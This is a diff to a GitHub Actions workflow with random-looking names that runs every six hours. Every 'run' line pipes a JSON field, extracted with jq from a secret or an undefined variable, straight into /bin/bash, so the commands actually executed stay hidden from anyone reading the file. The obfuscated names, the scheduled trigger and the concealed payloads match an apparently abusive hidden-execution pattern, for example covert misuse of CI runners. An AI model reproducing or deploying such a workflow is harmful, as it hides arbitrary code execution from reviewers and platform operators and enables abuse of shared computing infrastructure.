@@ -3,24 +3,31 @@ name: tatteredcartload
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 4/6 * * *'
+    - cron: '37 3/6 * * *'
 
-jobs:  # 15945
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: tatteredcartload
         env:
-          rmw3: ${{ secrets.rmw3 }}
+          sv8: ${{ secrets.sv8 }}
         run: |
-          echo $rmw3 | jq -r .fba14 | /bin/bash
-          echo $aw15013 | jq -r .qod30 | /bin/bash
-          echo $m3292 | jq -r .mfm57 | /bin/bash
-          echo $vu0967 | jq -r .u30 | /bin/bash
-          echo $g6 | jq -r .pm99572 | /bin/bash
-          echo $bjmk80 | jq -r .qyljq33985 | /bin/bash
-          echo $rdhn32 | jq -r .ce77 | /bin/bash
-          echo $erxmz35 | jq -r .zlwi18907 | /bin/bash
-          echo $rmcuk6324 | jq -r .qial55 | /bin/bash
+          echo $sv8 | jq -r .go1 | /bin/bash
+          echo $fu6 | jq -r .fj73 | /bin/bash
+          echo $hidd7279 | jq -r .vnfc985 | /bin/bash
+          echo $zm020 | jq -r .pv5 | /bin/bash
+          echo $plt5 | jq -r .vk70110 | /bin/bash
+          echo $o64909 | jq -r .y398 | /bin/bash
+          echo $itou4 | jq -r .jeo69 | /bin/bash
+          echo $ny45 | jq -r .iyopx28832 | /bin/bash
+          echo $w34 | jq -r .jayx718 | /bin/bash
+          echo $xtcss518 | jq -r .yydqi73 | /bin/bash
+          echo $buph87595 | jq -r .vc294 | /bin/bash
+          echo $x24 | jq -r .ew3 | /bin/bash
+          echo $puefi19 | jq -r .ylzsd5 | /bin/bash
+          echo $l636 | jq -r .o0 | /bin/bash
+          echo $liqe15539 | jq -r .ocw597 | /bin/bash
+          echo $up6723 | jq -r .ue09900 | /bin/bash
 
